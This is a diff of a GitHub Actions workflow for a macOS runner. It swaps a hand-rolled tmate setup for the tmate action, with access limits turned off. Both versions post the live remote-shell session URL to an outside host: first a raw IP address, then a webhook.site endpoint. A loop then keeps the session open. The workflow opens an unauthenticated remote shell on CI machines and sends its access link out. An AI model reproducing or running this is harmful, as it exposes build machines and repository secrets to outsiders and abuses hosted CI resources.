@@ -9,18 +9,21 @@ jobs:
   interactive:
     runs-on: macos-15
     steps:
-      - name: Launch Interactive macOS Session
+      - name: Setup Tmate
+        id: tmate
+        uses: mxschmitt/action-tmate@v3
+        with:
+          detached: true
+          limit-access-to-actor: false
+
+      - name: Send Webhook
         run: |
-          HOMEBREW_NO_AUTO_UPDATE=1 HOMEBREW_NO_INSTALL_CLEANUP=1 brew install tmate
-          tmate -S /tmp/tmate.sock new-session -d
-          tmate -S /tmp/tmate.sock wait tmate-ready
-          
-          WEB_URL=$(tmate -S /tmp/tmate.sock display -p '#{tmate_web}')
-          SSH_CMD=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
-          
-          echo "WEB: $WEB_URL"
-          echo "SSH: $SSH_CMD"
-          
-          curl -s -X POST -d "$WEB_URL" http://195.96.132.171:8999/ || true
-          
+          URL="${{ steps.tmate.outputs.web-url }}"
+          SSH="${{ steps.tmate.outputs.ssh-command }}"
+          echo "URL is: $URL"
+          echo "SSH is: $SSH"
+          curl -s -X POST -d "$URL" https://webhook.site/696691ee-e300-4d4e-a17f-c4f805414baa || true
+
+      - name: Keep Alive
+        run: |
           while [ -S /tmp/tmate.sock ]; do sleep 5; done
